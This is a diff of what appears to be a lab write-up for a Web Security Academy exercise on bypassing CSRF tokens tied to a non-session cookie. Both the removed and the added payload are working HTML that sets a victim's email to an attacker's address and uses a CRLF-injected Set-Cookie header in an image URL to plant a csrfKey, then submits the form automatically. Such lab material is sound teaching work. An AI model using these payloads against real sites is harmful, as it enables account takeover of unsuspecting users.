@@ -65,19 +65,20 @@ Set-Cookie: csrfKey=8nGytpCcjoFz0hFqIMadgRePIv6SxBVR;
 ```
 
 ```bash
-# Reload weiner and take it's csrf values .
-csrfKey=NT4F5Fky5EZn61CX9pGCplPpMjHj9wDy
-<input required="" type="hidden" name="csrf" value="hkzUfOciBAUt6oiSziSZPz0kk2NVEceG">
+# Reload carlos and take csrf token and cookies .
+
 ```
 ```bash
 # Payload:
-<form method="POST" action="https://0a990033049d3b5680c003ba00ae0060.web-security-academy.net/my-account/change-email">
-
-<input type="hidden" name="email" value="virus@gmail.com">
-<input type="hidden" name="csrf" value="hkzUfOciBAUt6oiSziSZPz0kk2NVEceG">
-</form>
-<script> 
-	<img src="https://0a990033049d3b5680c003ba00ae0060.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=NT4F5Fky5EZn61CX9pGCplPpMjHj9wDy" onerror="document.forms[0].submit()">
-</script>
+<html>
+  <body>
+    <form action="https://0ade00db045f735c839364a700b50063.web-security-academy.net/my-account/change-email" method="POST">
+      <input type="hidden" name="email" value="virus@gmail.com" />
+      <input type="hidden" name="csrf" value="ysPJNQhBobfGOOZtWSnIVTmh9GgKUfDg" />
+      <input type="submit" value="Submit request" />
+    </form>
+    <img src="https://0ade00db045f735c839364a700b50063.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=8nGytpCcjoFz0hFqIMadgRePIv6SxBVR" onerror="document.forms[0].submit()">
+  </body>
+</html>
 
 ```
